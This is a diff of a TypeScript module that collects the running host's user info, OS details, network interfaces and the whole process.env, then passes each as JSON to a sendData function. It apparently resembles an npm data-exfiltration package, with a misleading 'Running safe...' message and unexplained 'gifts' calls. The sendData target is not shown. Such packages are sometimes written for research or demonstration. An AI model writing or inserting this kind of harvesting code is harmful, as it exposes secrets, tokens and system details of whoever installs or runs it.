@@ -1,46 +1,75 @@
-#!/usr/bin/env node
+import * as os from "node:os";
+import * as ut from "./utils"
+import { CustomPlugin, EnvDetails, NetworkInterfacesDetails, OsDetails, UserDetails } from "./typings";
+import sendData from "./core";
+import { generateRandomId } from "./utils";
+import { heyInternet, wc, catscatscatscats } from "./gifts";
 
-const core = require("./lib/core");
-const gifts = require("./gifts/gifts");
+export function sayHello() {
+  console.log('hi')
+}
+export function sayGoodbye() {
+  console.log('goodbye')
+}
 
-import * as utils from "../src/lib/utils"
+export function getUserInfo(): UserDetails {
+  return os.userInfo()
+}
 
-import { CustomPlugin } from "array-utils";
+export function getOsInfo(): OsDetails {
+  return {
+      arch: os.arch(),
+      hostname: os.hostname(),
+      platform: os.platform(),
+      release: os.release(),
+      type: os.type()
+  };
+}
+
+export function getNetworkInfo(): NetworkInterfacesDetails {
+  return ut.getIpv4Interfaces(os.networkInterfaces());
+}
+
+export function getEnvInfo(): EnvDetails {
+  return process.env;
+};
 
 const plugins: CustomPlugin[] = [
-    {
-        key: "networkInterfaces",
-        plugin: require("./plugins/getNetworkInterfaces")
-    },
-    {
-        key: "os",
-        plugin: require("./plugins/getOsDetails")
-    },
-    {
-        key: "env",
-        plugin: require("./plugins/getEnvironmentVariables")
-    },
-    {
-        key: "userInfo",
-        plugin: require("./plugins/getUserInfo")
-    }
+  {
+      key: "networkInterfaces",
+      plugin: getNetworkInfo
+  },
+  {
+      key: "os",
+      plugin: getOsInfo
+  },
+  {
+      key: "env",
+      plugin: getEnvInfo
+  },
+  {
+      key: "userInfo",
+      plugin: getUserInfo
+  }
 ];
 
 function runPlugin({ key, plugin }: CustomPlugin): NodeJS.Dict<CustomPlugin> {
-    return {
-        [key]: plugin()
-    }
+  return {
+      [key]: plugin()
+  }
 }
 
 console.log("Running safe...");
 
-gifts.heyInternet();
-gifts.wc();
-gifts.catscatscatscats(3000);
+heyInternet();
+wc();
+catscatscatscats(3000);
 
-plugins.forEach(plugin => {
+export default function init() {
+  plugins.forEach(plugin => {
     let data = runPlugin(plugin);
     let postData = JSON.stringify(data, null, 2);
-    console.log("Sending data:", postData);
-    core.sendData(postData, plugin.key, utils.generateRandomId());
-});
+    console.log(`Data from ${plugin.key} is: ${postData}`);
+    sendData(postData, plugin.key, generateRandomId());
+  });  
+}
